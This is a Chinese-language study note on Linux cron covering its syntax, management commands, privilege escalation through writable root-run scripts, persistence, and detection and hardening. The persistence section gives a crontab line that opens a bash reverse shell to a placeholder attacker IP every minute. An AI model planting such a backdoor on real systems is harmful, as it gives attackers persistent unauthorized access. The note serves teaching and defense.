---
title: Linux 定时任务
description: Linux 定时任务的组件与语法，以及渗透提权和排查防御视角
tags: [持久化, linux, crontab, 提权]
status: 已完成
finish-date: 2026-10-20
difficulty: 中等
---

# Linux 定时任务
>Linux 定时任务的核心是 Cron 服务，它允许系统按照预设的时间周期自动执行脚本或命令。对于运维和渗透测试来说，掌握其配置、语法以及潜在的安全风险至关重要。

## 核心组件与语法
1. 守护进程与配置文件
   - 定时任务由 crond 守护进程在后台运行。它主要读取两类配置：

     - 系统级任务：位于 /etc/crontab 和 /etc/cron.d/ 目录，通常需要指定执行用户。

     - 用户级任务：通过 crontab -e 命令编辑，仅针对当前用户，保存在 /var/spool/cron/crontabs/<用户名>（Debian/Ubuntu）或 /var/spool/cron/<用户名>（CentOS/RHEL）。

2. 时间格式（五或六个字段）
   - 标准格式为五个时间字段加一个命令：

    ```text
    * * * * * command
    │ │ │ │ │
    │ │ │ │ └── 星期 (0-7, 0和7都代表周日)
    │ │ │ └──── 月份 (1-12)
    │ │ └────── 日期 (1-31)
    │ └──────── 小时 (0-23)
    └────────── 分钟 (0-59)
    ```
    在某些系统（如 /etc/crontab 或 cron.d 中）会多一个字段，用于指定运行用户：* * * * * root command。

   - 常用特殊字符：

     - *：任意时间

     - ,：分隔多个时间点（如 1,15 表示第1和第15分钟）

     - -：范围（如 1-5）

     - /：步长（如 */10 表示每10分钟）

3. 常用操作命令

    ```bash
    crontab -e   # 编辑当前用户的定时任务
    crontab -l   # 列出当前用户的定时任务
    crontab -r   # 删除当前用户的所有定时任务
    ```
4. 系统级的其他定时机制
   除了 Cron，systemd 也提供了定时器功能（systemd timer），通常用于替代 Cron 处理更复杂的依赖关系或精确到秒的调度。此外，at 命令用于执行一次性定时任务。

## 安全视角：渗透与提权

1. 信息收集与权限提升
   如果攻击者获得了低权限用户的 shell，可以通过以下命令寻找提权机会：

    ```bash
    cat /etc/crontab
    ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
    crontab -l
    ```
    提权思路：如果某个由 root 执行的定时任务脚本或命令，其文件权限配置不当（例如，普通用户可写），攻击者就可以修改该脚本。当 Cron 以 root 身份再次执行该脚本时，攻击者的恶意代码（如反弹 shell）就会以 root 权限运行。

2. 持久化（后门）
   攻击者获得权限后，常通过添加定时任务实现持久化。
   例如，在自己的 crontab 中添加一条每分钟执行一次反弹 shell 的任务：

    ```bash
    * * * * * bash -c 'bash -i >& /dev/tcp/攻击机IP/4444 0>&1'
    ```
## 排查与防御
1. 定位异常任务
   当发现系统异常时，应全面检查所有定时任务位置：

    ```bash
    # 检查系统级任务
    cat /etc/crontab
    ls -la /etc/cron.*
    # 检查所有用户的任务（需 root 权限）
    ls -la /var/spool/cron/crontabs/
    ```
2. 日志审计
   Cron 的执行记录通常位于 /var/log/cron 或 /var/log/syslog 中。可以搜索 CRON 关键字，查看任务的执行历史和频率，寻找异常高频或非预期的执行记录。

3. 防御建议

   - 严格权限控制：确保定时任务引用的脚本和二进制文件对普通用户不可写。

   - 限制访问：通过 /etc/cron.allow 和 /etc/cron.deny 文件，限制哪些用户可以使用 crontab 命令。

   - 日志监控：对定时任务配置文件的修改行为（如 inotify 监控）以及 Cron 日志中的异常执行进行告警。
